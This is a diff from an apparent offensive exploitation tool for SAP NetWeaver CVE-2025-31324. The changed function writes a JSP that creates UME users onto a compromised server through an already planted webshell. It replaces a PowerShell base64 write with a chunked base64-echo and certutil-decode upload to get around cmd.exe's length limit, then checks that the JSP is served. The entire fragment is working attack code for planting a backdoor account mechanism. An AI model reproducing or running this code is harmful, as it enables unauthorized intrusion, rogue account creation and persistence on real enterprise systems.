@@ -582,17 +582,34 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
                           f"cannot determine real irj/root")}
 
     # --- Step 3: write the UME JSP to the discovered directory ---
+    # UME_CREATE_JSP is ~10.7 KB raw (~14.4 KB base64) — a single PowerShell
+    # [IO.File]::WriteAllBytes('PATH',[Convert]::FromBase64String('BASE64'))
+    # blows past cmd.exe's 8191-char command-line limit and gets silently
+    # truncated, leaving a mangled/empty file.  Use the chunked base64-echo
+    # + certutil -decode helper that the GW path already relies on.
+    try:
+        from sap_cve_2025_31324 import write_file_via_shell
+    except Exception as e:
+        return {"success": False,
+                "error": f"sap_cve_2025_31324 module not importable: {e}"}
+
     jsp_name = _random_jsp_name("ume")
     target_path = f"{dir_path}\\{jsp_name}"
-    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
-    ps_cmd = (f"[IO.File]::WriteAllBytes('{target_path}',"
-              f"[Convert]::FromBase64String('{jsp_b64}'))")
-    full = f"powershell.exe -NoProfile -Command {ps_cmd}"
-    wr = writer_fn(full)
+    shell_url = shells[-1].get("url", "")
+    if not shell_url:
+        return {"success": False,
+                "error": "webshell record missing 'url' — cannot chunk-write"}
+
+    wr = write_file_via_shell(shell_url, target_path,
+                               UME_CREATE_JSP.encode("utf-8"),
+                               chunk_size=3000, timeout=20.0)
     if not wr.get("success"):
         return {"success": False,
-                "error": f"PowerShell write failed: {wr.get('error', '?')}",
+                "error": (f"chunked write failed: {wr.get('error', '?')} "
+                          f"(chunks_written={wr.get('chunks_written', 0)})"),
                 "target_path": target_path}
+    print(f"[*] {sid}: wrote {target_path} in {wr.get('chunks_written')} "
+          f"chunks")
 
     # --- Step 4: GET-probe to confirm the JSP is actually served ---
     scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
